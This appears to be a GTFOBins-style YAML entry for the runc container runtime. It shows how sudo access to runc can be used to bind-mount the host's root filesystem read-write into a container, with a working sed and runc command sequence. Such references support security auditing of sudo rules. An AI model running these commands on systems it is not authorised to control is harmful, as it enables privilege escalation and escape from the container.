---
description: Open Container Initiative runtime.
functions:
  sudo:
    - description: |
        Inside the `"mounts"` section of the created `config.json` add the following lines:
        ```
        {
            "destination": "/",
            "type": "bind",
            "source": "/",
            "options": [
                "rbind",
                "rw",
                "rprivate"
            ]
        },
        ```
        Start the container, the root folder is the one from the host.
      code: |
        cd $(mktemp -d) && mkdir rootfs
        runc spec
        sed -i '/mounts/a{"destination":"/","type":"bind","source":"/","options":["rbind","rw","rprivate"]},' config.json

        sudo runc run shell
---
